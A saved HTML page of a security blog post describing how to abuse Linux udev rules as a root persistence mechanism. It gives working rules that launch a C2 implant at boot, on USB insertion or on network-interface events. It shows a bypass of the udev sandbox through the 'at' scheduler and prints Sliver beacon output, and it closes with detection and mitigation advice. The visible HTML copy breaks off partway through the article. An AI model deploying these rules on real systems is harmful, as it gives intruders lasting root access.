<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Leveraging Linux udev for persistence | Eder's Blog</title>
<meta name=keywords content="persistence,linux"><meta name=description content="For some fun and a bit of persistence"><meta name=author content="Eder P. Ignacio"><link rel=canonical href=http://localhost:1313/en/posts/leveraging-Linux-udev-for-persistence/><link crossorigin=anonymous href=/assets/css/stylesheet.fe23d69c279a1e3a319079b70d9222b26ae46df593d56bfd8b6c6373e2cf0202.css integrity="sha256-/iPWnCeaHjoxkHm3DZIismrkbfWT1Wv9i2xjc+LPAgI=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/en/posts/leveraging-Linux-udev-for-persistence/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="Leveraging Linux udev for persistence"><meta property="og:description" content="For some fun and a bit of persistence"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/en/posts/leveraging-Linux-udev-for-persistence/"><meta property="og:image" content="http://localhost:1313/posts/leveraging-Linux-udev-for-persistence/lights-prisms-effect-close-up.jpg"><meta property="article:section" content="en"><meta property="article:published_time" content="2024-02-21T19:00:12+01:00"><meta property="article:modified_time" content="2024-02-21T19:00:12+01:00"><meta property="og:site_name" content="Eder's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/posts/leveraging-Linux-udev-for-persistence/lights-prisms-effect-close-up.jpg"><meta name=twitter:title content="Leveraging Linux udev for persistence"><meta name=twitter:description content="For some fun and a bit of persistence"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Leveraging Linux udev for persistence","item":"http://localhost:1313/en/posts/leveraging-Linux-udev-for-persistence/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Leveraging Linux udev for persistence","name":"Leveraging Linux udev for persistence","description":"For some fun and a bit of persistence","keywords":["persistence","linux"],"articleBody":" Update 2025/03/26 I’m excited to share that I contributed to MITRE ATT\u0026CK v16.1 matrix (October 31, 2024) with the inclusion of this technique: T1564.017 (udev rules for persistence) [6]. Introduction udev is widely known among system administrators. It’s a device manager for the Linux kernel that allows users to manage devices in the /dev/ directory and create actions based on hardware events. Common use cases include renaming a network interface or modifying rights over a specific hard disk when they’re plugged in. Among the capabilities of udev is the execution of scripts based on hardware events (such as detection), which makes it a good candidate to be employed as a persistence mechanism. To my surprise, at the time I ran into udev there was no subtechnique listed in MITRE ATT\u0026CK matrix. This fact led me to start a mini-research and explore this possibility. In this article, I will share how I run into udev and how I could bypass the restrictions that it presents in order to use it as a persistence mechanism in a red team operation.\nNote After finishing writing this article and revisiting my research for references, I did come across a few (this one [4] or this one [5]), which I didn’t find initially. However, these references discuss the possibility of using udev; none of them address the constraints imposed by udev and its evasion (nor do they provide a functional Proof of Concept). Therefore, in practical terms, the proposed methods would not work (at least in 2024) in an operation requiring the deployment of a network implant. How it all began During my free time, while doing offsec non-related things, I wanted to create a backup of my system when my external hard drive was connected. It was at that moment when I encountered udev which, among its various capabilities, allows the execution of the backup script upon the connection of the hard drive. At that moment, a lightbulb went off my head: Uh! This is a great persistence method. Upon any hardware detection I can trigger persistence — I thought. At that very moment I headed to MITRE ATT\u0026CK matrix, to the tactic TA0003 Persistence , and the technique T1546 Event Triggered Execution, waiting to locate the subtechnique to see how it was being employed by threat actors. It didn’t exist. Even after looking it up in search engines I still found nothing **(see the note in introduction). That was when I started my research aiming to contribute to the community, since I thought — and I think — that is likely being used with hight probaility by threat actors. Therefore, it should be known by the Blue Team as well as my Red Team colleagues to be used in their operations.\nA bit of theory: udev Before exploiting anything, it’s a must to understand it. This is not a `udev` guide I’ll only cover the basics and things that are interesting to us from an attacker perspective. Going deep in udev and rules creation is out of the scope of this article. I encourage the reader to play with the rules and adapt to their needs. Great references can be found here [1] or here[2]. If you know the basics of udev, feel free to jump to the next chapter. What is udev? What better than taking a look to the manual, in this case the Arch Wiki:\nudev is a userspace system that enables the operating system administrator to register userspace handlers for events. The events received by udev’s daemon are mainly generated by the (Linux) kernel in response to physical events relating to peripheral devices. As such, udev’s main purpose is to act upon peripheral detection and hot-plugging, including actions that return control to the kernel, e.g., loading kernel modules or device firmware. Another component of this detection is adjusting the permissions of the device to be accessible to non-root users and groups. udev is part of systemd and thus installed by default (systemd-udevd.service)\nIn a few words, what is interesting to us:\nIt allows to register the execution of actions in response to physical events related to hardware, such as connection or disconnection. It is installed by default, being enabled as a system service. Due to the operations it performs, it runs in the context of the superuser root. udev rules It’s simple. udev rules define the relationship between the event and the action to undertake. They define the event handlers. Each rule is located in a rule file, with a .rules file extension.\nLocation The rules created by administrators are in /etc/udev/rules.d/; those provided by the system or generated dynamically are located in /usr/lib/udev/rules.d/ and /run/udev/rules.d/, respectively.\nProcessing logic and execution The rules are sorted and processed collectively, not taking into account the source directory. If two or more rules have the same name, only the one with the highest priority is executed. The priority is measured based on the source directory of the rule file (from more to less): /etc/ \u003e /run/ \u003e /usr/.\nIn the majority of current Kernels (with inotify support), rule modification and creation are loaded automatically. If not, udevcontrol must be employed. Once loaded, one of the following actions is needed to trigger the rule:\nCarry out the action listed in the rule (e.g., connection or disconnection) Execute udevtrigger (e.g., for non-removable devices) Syntax and examples Each rule is constructed of a series of key-value pairs, comma-separated. In addition, a rule must contain at least one match key and one assignment key:\nThe first part of the rule is composed of the match keys. They allow you to set the actions (e.g., plug in or plug out) or the type of device (e.g., if it’s a USB, a specific attribute that belongs only to a specific device, such as an ID, and so on) The second part is the assignment key. It dictates the action to accomplish if the previous match keys are fullfiled: change a device name or rights over it, create a symbolic link, run a script, etc. Parts of a udev rule that renames the name of a specific hard disk\n# Highlighted: key-value match pairs; no highlighted: assignment key-value.\nSUBSYSTEM==\"block\", SUBSYSTEMS==\"scsi\", ENV{ID_SERIAL_SHORT}==\"E0D55EA57414F5B1289F03D5\" , NAME=\"my_hard_disk\"\nNice. But how do we obtain the matching keys to identify our device in the previous rule? Very simple, by executing udevadm info on the path /dev of the device:\ntest@test:~$ udevadm info --path=$(udevadm info --query=path --name=/dev/sdb1) P: /devices/pci0000:00/0000:00:0c.0/usb2/2-1/2-1:1.0/host3/target3:0:0/3:0:0:0/block/sdb/sdb1 N: sdb1 L: 0 S: disk/by-label/KINGSTON S: disk/by-uuid/5E0B-FD92 [..] E: SCSI_MODEL_ENC=DataTraveler\\x203.0 E: ID_VENDOR=Kingston E: ID_VENDOR_ENC=Kingston E: ID_MODEL=DataTraveler_3.0 E: ID_MODEL_ENC=DataTraveler\\x203.0 E: ID_TYPE=disk E: DM_MULTIPATH_DEVICE_PATH=0 E: ID_SCSI_INQUIRY=1 E: ID_VENDOR_ID=0951 E: ID_MODEL_ID=1666 E: ID_REVISION=0001 E: ID_SERIAL=Kingston_DataTraveler_3.0_E0D55EA57414F5B1289F03D5-0:0 E: ID_SERIAL_SHORT=E0D55EA57414F5B1289F03D5 [...] E: DEVLINKS=/dev/disk/by-label/KINGSTON /dev/disk/by-uuid/5E0B-FD92 /dev/disk/by-id/usb-Kingston_DataTraveler_3.0_E0D55EA57414F5B1289F03D5-0:0-part1 /dev/disk/by-partuuid/d67c4776-01 /dev/disk/by-path/pci-0000:00:0c.0-usb-0:1:1.0-scsi-0:0:0:0-part1 E: TAGS=:systemd: E: CURRENT_TAGS=:systemd: To match the previous USB, we could point to its serial identifier. In this case, we’ll create a symlink on connection:\ntest@test:~$ cat /etc/udev/rules.d/test.rules KERNEL==\"sdb[0-9]\", SUBSYSTEMS==\"usb\", ENV{ID_SERIAL_SHORT}==\"E0D55EA57414F5B1289F03D5\", SYMLINK+=\"super_usb\" We unplug and plug in the USB, and confirm the execution of the rule by checking that the symbolic link has been generated:\ntest@test:~$ ls -la /dev/super_usb lrwxrwxrwx 1 root root 4 Feb 5 19:56 /dev/super_usb -\u003e sdb1 On the other hand, instead of pointing to a specific device, it is possible to point to a father device. In other words, it is possible to point to usb subsystems or to the PCI subsystem. This is very interesting to us as attackers because this way the rule will be triggered even at system startup. It will not only help us to establish persistence upon the detection of a specific device but also ensure it at system startup.\ntest@test:~$ cat /etc/udev/rules.d/test.rules SUBSYSTEMS==\"usb\", RUN+=\"/bin/sh -c 'touch /home/test/hi.txt'\" Abusing udev rules to establish persistence Assumptions As it is a persistence method, we start from a scenario where we have compromised the machine and have root privileges. In this case, the persistence method we will employ involves executing an implant that call home to our Sliver C2 server. We could use a dropper to prevent the implant from touching the disk, but for the purposes of the PoC, we will directly download the implant to disk. It seemed too easy Having understood the theory, it seems easy:\nAs a match key, we set the detection of any usb subsystem. Besides triggering when it detects a device of this type, this will ensure execution (i.e., persistence) on every system startup. As a assignment key, we set the RUN key pointing to our implant. But before tackling with complexities, it’s preferable to simplify in order to debug and check that all is working as expected. We’ll create a rule that, instead of executing the implant, will run a script .sh which will write a file to disk.\nThe rule located at /etc/udev/rules.d/ttp.rules:\ntest@test:~$ cat /etc/udev/rules.d/ttp.rules SUBSYSTEMS==\"usb\", RUN+=\"/bin/sh -c '/opt/scripts/trigger.sh'\" The referenced script /opt/scripts/trigger.sh:\n#!/bin/bash # This workaround ensures that the execution is done only once. # Not very fancy, but quick. FILE=/home/test/file_udev$(($(date \"+%Y%m%d%H\"))) if [ ! -f $FILE ]; then touch $FILE fi We give execution rights to the scripts and plug in the USB:\ntest@test:/etc/udev/rules.d$ chmod +x /opt/scripts/trigger.sh test@test:/etc/udev/rules.d$ # check that the file doesn't exist test@test:/etc/udev/rules.d$ ls -la /home/test/file_* test@test:/etc/udev/rules.d$ ls: cannot access 'file_*': No such file or directory test@test:/etc/udev/rules.d$ # plug in the USB test@test:/etc/udev/rules.d$ # check that the rule has created the file test@test:/etc/udev/rules.d$ ls -la /home/test/file_* -rw-r--r-- 1 root root 0 ene 11 20:56 /home/test/file_1705002989316 The file is created, confirming the script execution through the udev rule after the event. The only thing left is to replace in the rule, on the RUN assignment key, the call to the script with the call to our implant:\nSUBSYSTEMS==\"usb\", RUN+=\"/bin/sh -c '/home/test/implant'\" We set the listener in the C2 server and plug in the USB as in the previous case. But nothing… complete silence on our C2 console. Neither calling the implant directly in the rule or through a .sh script… nothing.\nMy C2 console at that moment\nNote The references mentioned in the introduction ([4] and [5]) regarding udev as a persistence method end here: they directly call the payload from the rule, without considering the constraints presented by udev. Therefore, they are not functional, at least currently, for using a payload that requires a network-connected and long-running process, essential requirements for establishing network-level persistence. RTFM: udev restrictions According to udev man page:\nThis can only be used for very short-running foreground tasks. Running an event process for a long period of time may block all further events for this or a dependent device.\nNote that running programs that access the network or mount/unmount filesystems is not allowed inside of udev rules, due to the default sandbox that is enforced on systemd-udevd.service.\nStarting daemons or other long-running processes is not allowed; the forked processes, detached or not, will be unconditionally killed after the event handling has finished. In order to activate long-running processes from udev rules, provide a service unit and pull it in from a udev device using the SYSTEMD_WANTS device property. See systemd.device(5) for details.\nIt seems that we have ran into a dead end here. udev is executed in a sandbox with some restrictions that are vital to our persistence through the execution of the implant:\nit doesn’t allow network access for the executed processes it doesn’t allow running processes in background or long running processes Note Reading the last sentence of the previous man, there is an option through calling a service. This option doesn’t make much sense for us since persistence would take place through T1543.002 Create or Modify System Process: Systemd Service. It would be more logical to create the malicious service directly rather than calling it through udev. But now that we’ve made it this far, we won’t give up.\nBypassing udev restrictions If udev presents these constraints, why not, through the rule, create a new independent and detached process that won’t have the restrictions and use it to execute the implant? Two options come to my mind:\nThe quickest: use a GTFOBin such as at that will execute the implant. at allows scheduling the execution of commands in the future. Thus, taking a look at the process tree it won’t be attached to udev and therefore won’t have the restrictions. There are references [3] regarding to this to execute scripts with network access. Additionally, regarding long-runnning process, one of the previous references [1] glimpses this possibility: One workaround for this limitation is to make sure your program immediately detaches itself.\nProcess injection. To inject the implant shellcode in another process could be a more than a feasible option to bypassudev restrictions. This option is out of the scope of this article and is left as an exercise for the reader. Using at to bypass restrictions The good thing about at is that is a binary from the official repositories, and it’s installed by default in some distributions . This turns it into a Living Of The Land Binary (called specifically GTFOBin for Unix binaries), which will help us going under the radar in some cases.\nSo let’s generate the rule (/etc/udev/rules.d/ttp.rules) calling at, that will schedule the implant to execute at the same time:\nSUBSYSTEMS==\"usb\", RUN+=\"/usr/bin/at -M -f /opt/scripts/trigger.sh now\" Note In the case of Ubuntu Server 22.04 LTS, it is necessary to install at from the official repositories if it has not been installed previously. The script pointed by at located at /opt/scripts/trigger.sh:\n#!/bin/bash # This workaround ensures that the execution is done only once. # Not very fancy, but quick. FILE=/home/test/file_udev$(($(date \"+%Y%m%d%H\"))) if [ ! -f $FILE ]; then touch $FILE /home/test/implant fi Let’s plug in a USB and… we receive the connection on our C2! (if we boot the machine, we get the same result without the need of plugging in a USB):\n[*] Beacon 52e736e5 BROKEN_THERAPIST - 10.0.2.6:34500 (test) - linux/amd64 - Mon, 22 Jan 2024 21:03:08 CET sliver \u003e use 52e736e5-0027-4a8c-8d40-b151759c163d [*] Active beacon BROKEN_THERAPIST (52e736e5-0027-4a8c-8d40-b151759c163d) sliver (BROKEN_THERAPIST) \u003e info Beacon ID: 52e736e5-0027-4a8c-8d40-b151759c163d Name: BROKEN_THERAPIST Hostname: test UUID: 6ca0c150-15de-41a7-b798-7640129e1b93 Username: root UID: 0 GID: 0 PID: 1697 OS: linux Version: Linux test 5.15.0-91-generic Locale: Arch: amd64 Active C2: mtls://10.0.2.15:8888 Remote Address: 10.0.2.6:34500 Proxy URL: Interval: 5s Jitter: 3s First Contact: Mon Jan 22 21:03:08 CET 2024 (8s ago) Last Checkin: Mon Jan 22 21:03:09 CET 2024 (7s ago) Next Checkin: Mon Jan 22 21:03:15 CET 2024 (1s ago) sliver (BROKEN_THERAPIST) \u003e Let’s see it in action:\nYour browser does not support the video tag. We can also modify the match key of the rule to match the detection of any network interface different from loopback. This way, we ensure that each time the machine counts with a valid network interface, it’ll try to establish the connection to the C2. This event is produced at system startup. The rule would be the following:\nSUBSYSTEM==\"net\", KERNEL!=\"lo\", RUN+=\"/usr/bin/at -M -f /opt/scripts/trigger.sh now\" So each time the system boots, the persistence will be triggered:\nYour browser does not support the video tag. Mitigation and detection Mitigation Disabling the udev service (systemd-udevd.service) might seem like a good mitigation, but its capabilities would be lost. It could also present problems with the management and detection of devices. If this action is carried out, the consequences and caveats should be studied in depth before deploying in a production environment.\nDetection The detection mechanisms can be stablished at different levels:\nFile system Monitor the creation and modification of files in the directories where udev rules are located: /etc/udev/rules.d/, /usr/lib/udev/rules.d/ and /run/udev/rules.d/. Analyze and monitor changes on the files referenced in the rules, specifically in the RUN assignment key. Process creation Monitor the creation of new processes that are children of systemd-udevd.service at the process tree level. Process tree after implant execution\nOther (ab)uses Other use cases come to my mind from an attacker perspective:\nOther persistence alternatives. We covered the execution of the implant, but there are another options that could be interesting to trigger from udev, such as: T1136.001 Create Account: Local Account or T1098.004 Account Manipulation: SSH Authorized Keys. Privilege escalation: if we have compromised a user that has privileges to modify a udev rule file, or either the assignment key RUN points to the execution of a script or binary over which we have write privileges, this method could be used to escalate privileges on the system, as is being run as root. Final words In this post we have seen how to leverage udev to use it as a feasible persistence mechanism with the execution of a network implant, bypassing the restrictions in place due to its sandbox capabilities. I hope you find it useful and incorporate it into your red team arsenal or enhance your detection mechanisms. If you find any errors, have relevant information, or come across references discussing udev that consider the restrictions, don’t hesitate to contact me to include them.\nReferences [1] https://www.reactivated.net/writing_udev_rules.html [2] https://wiki.archlinux.org/title/Udev [3] https://askubuntu.com/questions/1166849/18-04-how-can-udev-rule-run-script-access-network [4] https://codexlynx.github.io/posts/2021/04/gaining-persistence-linux-udev.html [5] https://hadess.io/the-art-of-linux-persistence/ [6] https://attack.mitre.org/techniques/T1546/017/ ","wordCount":"2811","inLanguage":"en","datePublished":"2024-02-21T19:00:12+01:00","dateModified":"2024-02-21T19:00:12+01:00","author":{"@type":"Person","name":"Eder P. Ignacio"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/en/posts/leveraging-Linux-udev-for-persistence/"},"publisher":{"@type":"Organization","name":"Eder's Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Eder's Blog (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Eder's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=http://localhost:1313/ title=Blog><span>Blog</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>Tags</span></a></li><li><a href=http://localhost:1313/archive/ title=Archive><span>Archive</span></a></li><li><a href=http://localhost:1313/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a></div><h1 class="post-title entry-hint-parent">Leveraging Linux udev for persistence</h1><div class=post-description>For some fun and a bit of persistence</div><div class=post-meta><span title='2024-02-21 19:00:12 +0100 CET'>February 21, 2024</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;2811 words&nbsp;·&nbsp;Eder P. Ignacio</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#how-it-all-began>How it all began</a></li></ul></li><li><a href=#a-bit-of-theory-udev>A bit of theory: <code>udev</code></a><ul><li><a href=#what-is-udev>What is <code>udev</code>?</a></li><li><a href=#udev-rules><code>udev</code> rules</a></li></ul></li><li><a href=#abusing-udev-rules-to-establish-persistence>Abusing <code>udev</code> rules to establish persistence</a><ul><li><a href=#it-seemed-too-easy>It seemed too easy</a></li><li><a href=#rtfm-udev-restrictions>RTFM: <code>udev</code> restrictions</a></li><li><a href=#bypassing-udev-restrictions>Bypassing <code>udev</code> restrictions</a></li></ul></li><li><a href=#mitigation-and-detection>Mitigation and detection</a><ul><li><a href=#mitigation>Mitigation</a></li><li><a href=#detection>Detection</a></li></ul></li><li><a href=#other-abuses>Other (ab)uses</a></li><li><a href=#final-words>Final words</a></li><li><a href=#references>References</a></li></ul></nav></div></details></div><div class=post-content><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fas fa-info-circle fa-fw"></i>Update 2025/03/26<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>I&rsquo;m excited to share that I contributed to MITRE ATT&amp;CK v16.1 matrix (October 31, 2024) with the inclusion of this technique: T1564.017 (udev rules for persistence) <a href=https://attack.mitre.org/techniques/T1546/017/>[6]</a>.</div></div></div><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p><code>udev</code> is widely known among system administrators. It&rsquo;s a device manager for the Linux kernel that allows users to manage devices in the <code>/dev/</code> directory and create actions based on hardware events. Common use cases include renaming a network interface or modifying rights over a specific hard disk when they&rsquo;re plugged in. Among the capabilities of <code>udev</code> is the execution of scripts based on hardware events (such as detection), which makes it a good candidate to be employed as a persistence mechanism. To my surprise, at the time I ran into <code>udev</code> there was no subtechnique listed in MITRE ATT&amp;CK matrix. This fact led me to start a mini-research and explore this possibility. In this article, I will share how I run into <code>udev</code> and how I could bypass the restrictions that it presents in order to use it as a persistence mechanism in a red team operation.</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>After finishing writing this article and revisiting my research for references, I did come across a few (<a href=https://codexlynx.github.io/posts/2021/04/gaining-persistence-linux-udev.html>this one [4]</a> or <a href=https://hadess.io/the-art-of-linux-persistence/>this one [5]</a>), which I didn&rsquo;t find initially. However, these references discuss the possibility of using <code>udev</code>; none of them address the constraints imposed by <code>udev</code> and its evasion (nor do they provide a functional Proof of Concept). Therefore, in practical terms, the proposed methods would not work (at least in 2024) in an operation requiring the deployment of a network implant.</div></div></div><h3 id=how-it-all-began>How it all began<a hidden class=anchor aria-hidden=true href=#how-it-all-began>#</a></h3><p>During my free time, while doing offsec non-related things, I wanted to create a backup of my system when my external hard drive was connected. It was at that moment when I encountered <code>udev</code> which, among its various capabilities, allows the execution of the backup script upon the connection of the hard drive. At that moment, a lightbulb went off my head: <em>Uh! This is a great persistence method. Upon any hardware detection I can trigger persistence</em> — I thought. At that very moment I headed to MITRE ATT&amp;CK matrix, to the tactic <code>TA0003 Persistence</code> , and the technique <code>T1546 Event Triggered Execution</code>, waiting to locate the subtechnique to see how it was being employed by threat actors. It didn&rsquo;t exist. Even after looking it up in search engines I still found nothing <code>**(see the note in introduction)</code>. That was when I started my research aiming to contribute to the community, since I thought — and I think — that is likely being used with hight probaility by threat actors. Therefore, it should be known by the Blue Team as well as my Red Team colleagues to be used in their operations.</p><h2 id=a-bit-of-theory-udev>A bit of theory: <code>udev</code><a hidden class=anchor aria-hidden=true href=#a-bit-of-theory-udev>#</a></h2><p>Before exploiting anything, it&rsquo;s a must to understand it.<div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>This is not a `udev` guide<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>I&rsquo;ll only cover the basics and things that are interesting to us from an attacker perspective. Going deep in <code>udev</code> and rules creation is out of the scope of this article. I encourage the reader to play with the rules and adapt to their needs. Great references can be found <a href=https://www.reactivated.net/writing_udev_rules.html>here [1]</a> or <a href=https://wiki.archlinux.org/title/Udev>here[2]</a>. If you know the basics of <code>udev</code>, feel free to jump to the next chapter.</div></div></div></p><h3 id=what-is-udev>What is <code>udev</code>?<a hidden class=anchor aria-hidden=true href=#what-is-udev>#</a></h3><p>What better than taking a look to the manual, in this case the <a href=https://wiki.archlinux.org/title/Udev>Arch Wiki</a>:</p><blockquote><p><code>udev</code> is a userspace system that enables the operating system administrator to register userspace handlers for events. The events received by <code>udev</code>&rsquo;s daemon are mainly generated by the (Linux) kernel in response to physical events relating to peripheral devices. As such, <code>udev</code>&rsquo;s main purpose is to act upon peripheral detection and hot-plugging, including actions that return control to the kernel, e.g., loading kernel modules or device firmware. Another component of this detection is adjusting the permissions of the device to be accessible to non-root users and groups.
<code>udev</code> is part of systemd and thus installed by default (<code>systemd-udevd.service</code>)</p></blockquote><p>In a few words, what is interesting to us:</p><ul><li>It allows to register the execution of actions in response to physical events related to hardware, such as connection or disconnection.</li><li>It is installed by default, being enabled as a system service.</li><li>Due to the operations it performs, it runs in the context of the superuser <code>root</code>.</li></ul><h3 id=udev-rules><code>udev</code> rules<a hidden class=anchor aria-hidden=true href=#udev-rules>#</a></h3><p>It&rsquo;s simple. <code>udev</code> rules define the relationship between the event and the action to undertake. They define the event handlers. Each rule is located in a rule file, with a <code>.rules</code> file extension.</p><h4 id=location>Location<a hidden class=anchor aria-hidden=true href=#location>#</a></h4><p>The rules created by administrators are in <code>/etc/udev/rules.d/</code>; those provided by the system or generated dynamically are located in <code>/usr/lib/udev/rules.d/</code> and <code>/run/udev/rules.d/</code>, respectively.</p><h4 id=processing-logic-and-execution>Processing logic and execution<a hidden class=anchor aria-hidden=true href=#processing-logic-and-execution>#</a></h4><p>The rules are sorted and processed collectively, not taking into account the source directory. If two or more rules have the same name, only the one with the highest priority is executed. The priority is measured based on the source directory of the rule file (from more to less): <code>/etc/</code> > <code>/run/</code> > <code>/usr/</code>.</p><p>In the majority of current Kernels (with <code>inotify</code> support), rule modification and creation are loaded automatically. If not, <code>udevcontrol</code> must be employed. Once loaded, one of the following actions is needed to trigger the rule:</p><ul><li>Carry out the action listed in the rule (e.g., connection or disconnection)</li><li>Execute <code>udevtrigger</code> (e.g., for non-removable devices)</li></ul><h4 id=syntax-and-markexamplesmark>Syntax and examples<a hidden class=anchor aria-hidden=true href=#syntax-and-markexamplesmark>#</a></h4><p>Each rule is constructed of a series of key-value pairs, comma-separated. In addition, a rule must contain at least one match key and one assignment key:</p><ol><li>The first part of the rule is composed of the match keys. They allow you to set the actions (e.g., plug in or plug out) or the type of device (e.g., if it&rsquo;s a USB, a specific attribute that belongs only to a specific device, such as an ID, and so on)</li><li>The second part is the assignment key. It dictates the action to accomplish if the previous match keys are fullfiled: change a device name or rights over it, create a symbolic link, run a script, etc.</li></ol><blockquote><p>Parts of a <code>udev</code> rule that renames the name of a specific hard disk</p><p># Highlighted: key-value match pairs;
no highlighted: assignment key-value.</p><p><mark style=background-color:#e3c813>SUBSYSTEM=="block", SUBSYSTEMS=="scsi", ENV{ID_SERIAL_SHORT}=="E0D55EA57414F5B1289F03D5" </mark>, NAME="my_hard_disk"</p></blockquote><p>Nice. But how do we obtain the matching keys to identify our device in the previous rule? Very simple, by executing <code>udevadm info</code> on the path <code>/dev</code> of the device:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:~$ udevadm info --path<span class=o>=</span><span class=k>$(</span>udevadm info --query<span class=o>=</span>path --name<span class=o>=</span>/dev/sdb1<span class=k>)</span>
</span></span><span class=line><span class=cl>P: /devices/pci0000:00/0000:00:0c.0/usb2/2-1/2-1:1.0/host3/target3:0:0/3:0:0:0/block/sdb/sdb1
</span></span><span class=line><span class=cl>N: sdb1
</span></span><span class=line><span class=cl>L: <span class=m>0</span>
</span></span><span class=line><span class=cl>S: disk/by-label/KINGSTON
</span></span><span class=line><span class=cl>S: disk/by-uuid/5E0B-FD92
</span></span><span class=line><span class=cl><span class=o>[</span>..<span class=o>]</span>
</span></span><span class=line><span class=cl>E: <span class=nv>SCSI_MODEL_ENC</span><span class=o>=</span>DataTraveler<span class=se>\x</span>203.0
</span></span><span class=line><span class=cl>E: <span class=nv>ID_VENDOR</span><span class=o>=</span>Kingston
</span></span><span class=line><span class=cl>E: <span class=nv>ID_VENDOR_ENC</span><span class=o>=</span>Kingston
</span></span><span class=line><span class=cl>E: <span class=nv>ID_MODEL</span><span class=o>=</span>DataTraveler_3.0
</span></span><span class=line><span class=cl>E: <span class=nv>ID_MODEL_ENC</span><span class=o>=</span>DataTraveler<span class=se>\x</span>203.0
</span></span><span class=line><span class=cl>E: <span class=nv>ID_TYPE</span><span class=o>=</span>disk
</span></span><span class=line><span class=cl>E: <span class=nv>DM_MULTIPATH_DEVICE_PATH</span><span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>E: <span class=nv>ID_SCSI_INQUIRY</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>E: <span class=nv>ID_VENDOR_ID</span><span class=o>=</span><span class=m>0951</span>
</span></span><span class=line><span class=cl>E: <span class=nv>ID_MODEL_ID</span><span class=o>=</span><span class=m>1666</span>
</span></span><span class=line><span class=cl>E: <span class=nv>ID_REVISION</span><span class=o>=</span><span class=m>0001</span>
</span></span><span class=line><span class=cl>E: <span class=nv>ID_SERIAL</span><span class=o>=</span>Kingston_DataTraveler_3.0_E0D55EA57414F5B1289F03D5-0:0
</span></span><span class=line><span class=cl>E: <span class=nv>ID_SERIAL_SHORT</span><span class=o>=</span>E0D55EA57414F5B1289F03D5
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>E: <span class=nv>DEVLINKS</span><span class=o>=</span>/dev/disk/by-label/KINGSTON /dev/disk/by-uuid/5E0B-FD92 /dev/disk/by-id/usb-Kingston_DataTraveler_3.0_E0D55EA57414F5B1289F03D5-0:0-part1 /dev/disk/by-partuuid/d67c4776-01 /dev/disk/by-path/pci-0000:00:0c.0-usb-0:1:1.0-scsi-0:0:0:0-part1
</span></span><span class=line><span class=cl>E: <span class=nv>TAGS</span><span class=o>=</span>:systemd:
</span></span><span class=line><span class=cl>E: <span class=nv>CURRENT_TAGS</span><span class=o>=</span>:systemd:
